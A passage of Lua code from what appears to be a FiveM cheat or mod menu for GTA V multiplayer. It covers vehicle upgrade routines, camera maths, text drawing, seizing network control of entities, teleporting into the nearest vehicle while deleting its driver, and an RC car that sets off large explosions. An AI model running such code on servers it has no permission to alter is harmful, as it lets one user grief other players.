	currentPlayer = -1,
}

function FiveM.DrawPlayerInfo(player)
    -- Handles running code only once per user. Will run once per `SelectedPlayer` change
    if DrawPlayerInfo.currentPlayer ~= player then

        -- Current player selected
        DrawPlayerInfo.currentPlayer = player

        -- Drawing coordinates
        DrawPlayerInfo.mugshotWidth = buttonHeight / aspectRatio
        DrawPlayerInfo.mugshotHeight = DrawPlayerInfo.mugshotWidth * aspectRatio
        DrawPlayerInfo.x = menus[currentMenu].x - frameWidth / 2 - frameWidth - previewWidth / 2 
        DrawPlayerInfo.y = menus[currentMenu].y + titleHeight
        
        -- Player init
        DrawPlayerInfo.playerPed = GetPlayerPed(DrawPlayerInfo.currentPlayer)
        DrawPlayerInfo.playerName = FiveM:CheckName(GetPlayerName(DrawPlayerInfo.currentPlayer))


        local function RegisterPedHandle()
            
            if DrawPlayerInfo.handle and IsPedheadshotValid(DrawPlayerInfo.handle) then
        
                DrawPlayerInfo.pedHeadshot = false
                UnregisterPedheadshot(DrawPlayerInfo.handle)
                DrawPlayerInfo.handle = nil
                DrawPlayerInfo.txd = "null"
        
            end
        
            -- Get the ped headshot image.
            DrawPlayerInfo.handle = RegisterPedheadshot(DrawPlayerInfo.playerPed)
        
            while not IsPedheadshotReady(DrawPlayerInfo.handle) or not IsPedheadshotValid(DrawPlayerInfo.handle) do
                Wait(50)
            end
            
            if IsPedheadshotReady(DrawPlayerInfo.handle) and IsPedheadshotValid(DrawPlayerInfo.handle) then
                DrawPlayerInfo.txd = GetPedheadshotTxdString(DrawPlayerInfo.handle)
                DrawPlayerInfo.pedHeadshot = true
            else
                DrawPlayerInfo.pedHeadshot = false
            end
        end
        CreateThreadNow(RegisterPedHandle)
    end
end

function MaxOut(veh)
    SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
    SetVehicleWheelType(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 14, 16, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15) - 2, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16) - 1, false)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 17, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 18, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 19, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 20, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 21, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 22, true)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 23, 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 24, 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38) - 1, true)
    SetVehicleWindowTint(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1)
    SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
    SetVehicleNumberPlateTextIndex(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5)
end
function engine(veh)
	SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15) - 2, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16) - 1, false)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 17, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 18, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 19, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 21, true)
    SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)				
end
function engine1(veh)
    SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
    SetVehicleWheelType(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 14, 16, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15) - 2, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16) - 1, false)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 17, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 18, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 19, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 20, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 21, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 22, true)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 23, 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 24, 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38) - 1, true)
    SetVehicleWindowTint(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1)
    SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
    SetVehicleNumberPlateTextIndex(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5)
    SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15) - 2, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16) - 1, false)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 17, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 18, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 19, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 21, true)
    SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
end

function maxUpgrades(veh)
    ShowInfo("Maxed out your car")
    SetVehicleModKit(veh, 0)
	SetVehicleCustomPrimaryColour(GetVehiclePedIsIn(PlayerPedId(), 0), 0, 0, 0)
	SetVehicleCustomSecondaryColour(GetVehiclePedIsIn(PlayerPedId(), 0), 0, 0, 0)
	SetVehicleColours(veh, 12, 12)
	SetVehicleModColor_1(veh, 3, 0)
	SetVehicleExtraColours(veh, 3, 0)
	ToggleVehicleMod(veh, 18, 1)
	ToggleVehicleMod(veh, 22, 1)
	SetVehicleMod(veh, 16, 5, 0)
	SetVehicleMod(veh, 12, 2, 0)
	SetVehicleMod(veh, 11, 3, 0)
	SetVehicleMod(veh, 14, 14, 0)
	SetVehicleMod(veh, 15, 3, 0)
	SetVehicleMod(veh, 13, 2, 0)
	SetVehicleWindowTint(veh, 5)
	SetVehicleWheelType(veh, 0)
	SetVehicleMod(veh, 23, 21, 1)
	SetVehicleMod(veh, 0, 1, 0)
	SetVehicleMod(veh, 1, 1, 0)
	SetVehicleMod(veh, 2, 1, 0)
	SetVehicleMod(veh, 3, 1, 0)
	SetVehicleMod(veh, 4, 1, 0)
	SetVehicleMod(veh, 5, 1, 0)
	SetVehicleMod(veh, 6, 1, 0)
	SetVehicleMod(veh, 7, 1, 0)
	SetVehicleMod(veh, 8, 1, 0)
	SetVehicleMod(veh, 9, 1, 0)
	SetVehicleMod(veh, 10, 1, 0)
	IsVehicleNeonLightEnabled(veh, 1)
	SetVehicleNeonLightEnabled(veh, 0, 1)
	SetVehicleNeonLightEnabled(veh, 1, 1)
	SetVehicleNeonLightEnabled(veh, 2, 1)
	SetVehicleNeonLightEnabled(veh, 3, 1)
	SetVehicleNeonLightEnabled(veh, 4, 1)
	SetVehicleNeonLightEnabled(veh, 5, 1)
	SetVehicleNeonLightEnabled(veh, 6, 1)
	SetVehicleNeonLightEnabled(veh, 7, 1)
	SetVehicleModKit(veh, 0)
	ToggleVehicleMod(veh, 20, 1)
    SetVehicleModKit(veh, 0)
end


function GetSeatPedIsIn(ped)
    if not IsPedInAnyVehicle(ped, false) then return
    else
        veh = GetVehiclePedIsIn(ped)
        for i = 0, GetVehicleMaxNumberOfPassengers(veh) do
            if GetPedInVehicleSeat(veh) then return i end
        end
    end
end

function GetCamDirFromScreenCenter()
    local pos = GetGameplayCamCoord()
    local world = ScreenToWorld(0, 0)
    local ret = SubVectors(world, pos)
    return ret
end

function ScreenToWorld(screenCoord)
    local camRot = GetGameplayCamRot(2)
    local camPos = GetGameplayCamCoord()
    
    local vect2x = 0.0
    local vect2y = 0.0
    local vect21y = 0.0
    local vect21x = 0.0
    local direction = RotationToDirection(camRot)
    local vect3 = vector3(camRot.x + 10.0, camRot.y + 0.0, camRot.z + 0.0)
    local vect31 = vector3(camRot.x - 10.0, camRot.y + 0.0, camRot.z + 0.0)
    local vect32 = vector3(camRot.x, camRot.y + 0.0, camRot.z + -10.0)
    
    local direction1 = RotationToDirection(vector3(camRot.x, camRot.y + 0.0, camRot.z + 10.0)) - RotationToDirection(vect32)
    local direction2 = RotationToDirection(vect3) - RotationToDirection(vect31)
    local radians = -(math.rad(camRot.y))
    
    vect33 = (direction1 * math.cos(radians)) - (direction2 * math.sin(radians))
    vect34 = (direction1 * math.sin(radians)) - (direction2 * math.cos(radians))
    
    local case1, x1, y1 = WorldToScreenRel(((camPos + (direction * 10.0)) + vect33) + vect34)
    if not case1 then
        vect2x = x1
        vect2y = y1
        return camPos + (direction * 10.0)
    end
    
    local case2, x2, y2 = WorldToScreenRel(camPos + (direction * 10.0))
    if not case2 then
        vect21x = x2
        vect21y = y2
        return camPos + (direction * 10.0)
    end
    
    if math.abs(vect2x - vect21x) < 0.001 or math.abs(vect2y - vect21y) < 0.001 then
        return camPos + (direction * 10.0)
    end
    
    local x = (screenCoord.x - vect21x) / (vect2x - vect21x)
    local y = (screenCoord.y - vect21y) / (vect2y - vect21y)
    return ((camPos + (direction * 10.0)) + (vect33 * x)) + (vect34 * y)

end

function WorldToScreenRel(worldCoords)
    local check, x, y = GetScreenCoordFromWorldCoord(worldCoords.x, worldCoords.y, worldCoords.z)
    if not check then
        return false
    end
    
    screenCoordsx = (x - 0.5) * 2.0
    screenCoordsy = (y - 0.5) * 2.0
    return true, screenCoordsx, screenCoordsy
end

function RotationToDirection(rotation)
    local retz = math.rad(rotation.z)
    local retx = math.rad(rotation.x)
    local absx = math.abs(math.cos(retx))
    return vector3(-math.sin(retz) * absx, math.cos(retz) * absx, math.sin(retx))
end

local function GetCamDirection()
    local heading = GetGameplayCamRelativeHeading() + GetEntityHeading(PlayerPedId())
    local pitch = GetGameplayCamRelativePitch()
    
    local x = -math.sin(heading * math.pi / 180.0)
    local y = math.cos(heading * math.pi / 180.0)
    local z = math.sin(pitch * math.pi / 180.0)
    
    local len = math.sqrt(x * x + y * y + z * z)
    if len ~= 0 then
        x = x / len
        y = y / len
        z = z / len
    end
    
    return x, y, z
end



function ApplyForce(entity, direction)
    ApplyForceToEntity(entity, 3, direction, 0, 0, 0, false, false, true, true, false, true)
end

function RequestControlOnce(entity)
    if not NetworkIsInSession or NetworkHasControlOfEntity(entity) then
        return true
    end
    SetNetworkIdCanMigrate(NetworkGetNetworkIdFromEntity(entity), true)
    return NetworkRequestControlOfEntity(entity)
end

function RequestControl(entity)
    Citizen.CreateThread(function()
        local tick = 0
        while not RequestControlOnce(entity) and tick <= 12 do
            tick = tick + 1
            Wait(0)
        end
        return tick <= 12
    end)
end

function Oscillate(entity, position, angleFreq, dampRatio)
    local pos1 = ScaleVector(SubVectors(position, GetEntityCoords(entity)), (angleFreq * angleFreq))
    local pos2 = AddVectors(ScaleVector(GetEntityVelocity(entity), (2.0 * angleFreq * dampRatio)), vector3(0.0, 0.0, 0.1))
    local targetPos = SubVectors(pos1, pos2)
    
    ApplyForce(entity, targetPos)
end

function teleportToNearestVehicle()
    local playerPed = GetPlayerPed(-1)
    local playerPedPos = GetEntityCoords(playerPed, true)
    local NearestVehicle = GetClosestVehicle(GetEntityCoords(playerPed, true), 1000.0, 0, 4)
    local NearestVehiclePos = GetEntityCoords(NearestVehicle, true)
    local NearestPlane = GetClosestVehicle(GetEntityCoords(playerPed, true), 1000.0, 0, 16384)
    local NearestPlanePos = GetEntityCoords(NearestPlane, true)
drawNotification("~y~Wait...")
Citizen.Wait(1000)
if (NearestVehicle == 0) and (NearestPlane == 0) then
    drawNotification("~r~No Vehicle Found")
elseif (NearestVehicle == 0) and (NearestPlane ~= 0) then
    if IsVehicleSeatFree(NearestPlane, -1) then
        SetPedIntoVehicle(playerPed, NearestPlane, -1)
        SetVehicleAlarm(NearestPlane, false)
        SetVehicleDoorsLocked(NearestPlane, 1)
        SetVehicleNeedsToBeHotwired(NearestPlane, false)
    else
        local driverPed = GetPedInVehicleSeat(NearestPlane, -1)
        ClearPedTasksImmediately(driverPed)
        SetEntityAsMissionEntity(driverPed, 1, 1)
        DeleteEntity(driverPed)
        SetPedIntoVehicle(playerPed, NearestPlane, -1)
        SetVehicleAlarm(NearestPlane, false)
        SetVehicleDoorsLocked(NearestPlane, 1)
        SetVehicleNeedsToBeHotwired(NearestPlane, false)
    end
    drawNotification("~g~Teleported Into Nearest Vehicle!")
elseif (NearestVehicle ~= 0) and (NearestPlane == 0) then
    if IsVehicleSeatFree(NearestVehicle, -1) then
        SetPedIntoVehicle(playerPed, NearestVehicle, -1)
        SetVehicleAlarm(NearestVehicle, false)
        SetVehicleDoorsLocked(NearestVehicle, 1)
        SetVehicleNeedsToBeHotwired(NearestVehicle, false)
    else
        local driverPed = GetPedInVehicleSeat(NearestVehicle, -1)
        ClearPedTasksImmediately(driverPed)
        SetEntityAsMissionEntity(driverPed, 1, 1)
        DeleteEntity(driverPed)
        SetPedIntoVehicle(playerPed, NearestVehicle, -1)
        SetVehicleAlarm(NearestVehicle, false)
        SetVehicleDoorsLocked(NearestVehicle, 1)
        SetVehicleNeedsToBeHotwired(NearestVehicle, false)
    end
    drawNotification("~g~Teleported Into Nearest Vehicle!")
elseif (NearestVehicle ~= 0) and (NearestPlane ~= 0) then
    if Vdist(NearestVehiclePos.x, NearestVehiclePos.y, NearestVehiclePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) < Vdist(NearestPlanePos.x, NearestPlanePos.y, NearestPlanePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) then
        if IsVehicleSeatFree(NearestVehicle, -1) then
            SetPedIntoVehicle(playerPed, NearestVehicle, -1)
            SetVehicleAlarm(NearestVehicle, false)
            SetVehicleDoorsLocked(NearestVehicle, 1)
            SetVehicleNeedsToBeHotwired(NearestVehicle, false)
        else
            local driverPed = GetPedInVehicleSeat(NearestVehicle, -1)
            ClearPedTasksImmediately(driverPed)
            SetEntityAsMissionEntity(driverPed, 1, 1)
            DeleteEntity(driverPed)
            SetPedIntoVehicle(playerPed, NearestVehicle, -1)
            SetVehicleAlarm(NearestVehicle, false)
            SetVehicleDoorsLocked(NearestVehicle, 1)
            SetVehicleNeedsToBeHotwired(NearestVehicle, false)
        end
    elseif Vdist(NearestVehiclePos.x, NearestVehiclePos.y, NearestVehiclePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) > Vdist(NearestPlanePos.x, NearestPlanePos.y, NearestPlanePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) then
        if IsVehicleSeatFree(NearestPlane, -1) then
            SetPedIntoVehicle(playerPed, NearestPlane, -1)
            SetVehicleAlarm(NearestPlane, false)
            SetVehicleDoorsLocked(NearestPlane, 1)
            SetVehicleNeedsToBeHotwired(NearestPlane, false)
        else
            local driverPed = GetPedInVehicleSeat(NearestPlane, -1)
            ClearPedTasksImmediately(driverPed)
            SetEntityAsMissionEntity(driverPed, 1, 1)
            DeleteEntity(driverPed)
            SetPedIntoVehicle(playerPed, NearestPlane, -1)
            SetVehicleAlarm(NearestPlane, false)
            SetVehicleDoorsLocked(NearestPlane, 1)
            SetVehicleNeedsToBeHotwired(NearestPlane, false)
        end
    end
    drawNotification("~g~Teleported Into Nearest Vehicle!")
end

end

function ShowMPMessage(message, subtitle, ms)
    Citizen.CreateThread(function()
        Citizen.Wait(0)
        function Initialize(scaleform)
            local scaleform = RequestScaleformMovie(scaleform)
            while not HasScaleformMovieLoaded(scaleform) do
                Citizen.Wait(0)
            end
            PushScaleformMovieFunction(scaleform, "SHOW_SHARD_WASTED_MP_MESSAGE")
            PushScaleformMovieFunctionParameterString(message)
            PushScaleformMovieFunctionParameterString(subtitle)
            PopScaleformMovieFunctionVoid()
            Citizen.SetTimeout(6500, function()
                PushScaleformMovieFunction(scaleform, "SHARD_ANIM_OUT")
                PushScaleformMovieFunctionParameterInt(1)
                PushScaleformMovieFunctionParameterFloat(0.33)
                PopScaleformMovieFunctionVoid()
                Citizen.SetTimeout(3000, function()EndScaleformMovieMethod() end)
            end)
            return scaleform
        end
        
        scaleform = Initialize("mp_big_message_freemode")
        
        while true do
            Citizen.Wait(0)
            DrawScaleformMovieFullscreen(scaleform, 255, 255, 255, 150, 0)
        end
    end)
end

function ShowInfo(text)
    SetNotificationTextEntry("STRING")
    AddTextComponentString(text)
    DrawNotification(true, false)
end

function DrawTxt(text, x, y, scale, size)
    SetTextFont(0)
    SetTextProportional(1)
    SetTextScale(scale, size)
    SetTextDropshadow(1, 0, 0, 0, 255)
    SetTextEdge(1, 0, 0, 0, 255)
    SetTextDropShadow()
    SetTextOutline()
    SetTextEntry("STRING")
    AddTextComponentString(text)
    DrawText(x, y)
end

function DrawText3D(x, y, z, text)
    local onScreen, _x, _y = GetScreenCoordFromWorldCoord(x, y, z)
    local px, py, pz = table.unpack(GetGameplayCamCoords())
    local dist = GetDistanceBetweenCoords(px, py, pz, x, y, z, 1)
    
    local scale = (1 / dist) * 2
    local fov = (1 / GetGameplayCamFov()) * 100
    local scale = scale * fov
    
    if onScreen then
        SetTextScale(0.0 * scale, 0.55 * scale)
        SetTextFont(0)
        SetTextProportional(1)
        SetTextColour(255, 255, 255, 255)
        SetTextDropshadow(0, 0, 0, 0, 255)
        SetTextEdge(2, 0, 0, 0, 150)
        SetTextDropShadow()
        SetTextOutline()
        SetTextEntry("STRING")
        SetTextCentre(1)
        AddTextComponentString(text)
        DrawText(_x, _y)
    end
end



local entityEnumerator = {
    __gc = function(enum)
        if enum.destructor and enum.handle then
            enum.destructor(enum.handle)
        end
        enum.destructor = nil
        enum.handle = nil
    end
}

local RCCar = {} RCCar.Start = function() if DoesEntityExist(RCCar.Entity) then return end RCCar.Spawn() RCCar.Tablet(true) while DoesEntityExist(RCCar.Entity) and DoesEntityExist(RCCar.Driver) do Citizen.Wait(5) local distanceCheck = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()),  GetEntityCoords(RCCar.Entity), true) RCCar.DrawInstructions(distanceCheck) RCCar.HandleKeys(distanceCheck) if distanceCheck <= 10000000.0 then if not NetworkHasControlOfEntity(RCCar.Driver) then NetworkRequestControlOfEntity(RCCar.Driver) elseif not NetworkHasControlOfEntity(RCCar.Entity) then NetworkRequestControlOfEntity(RCCar.Entity) end else TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 6, 2500) end end end
RCCar.HandleKeys = function(distanceCheck) if IsControlJustReleased(0, 47) then if IsCamRendering(RCCar.Camera) then RCCar.ToggleCamera(false) else RCCar.ToggleCamera(true) end end if distanceCheck <= 10000000.0 then if IsControlJustPressed(0, 73) then RCCar.Attach("pick") end end if distanceCheck < 10000000.0 then if IsControlJustReleased(0, 108) then local coos = GetEntityCoords(RCCar.Entity, true) AddExplosion(coos.x, coos.y, coos.z, 2, 100000.0, true, false, 0) end if IsControlPressed(0, 172) and not IsControlPressed(0, 173) then TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 9, 1) end if IsControlJustReleased(0, 172) or IsControlJustReleased(0, 173) then TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 6, 2500) end if IsControlPressed(0, 173) and not IsControlPressed(0, 172) then TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 22, 1) end if IsControlPressed(0, 174) and IsControlPressed(0, 173) then TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 13, 1) end if IsControlPressed(0, 175) and IsControlPressed(0, 173) then 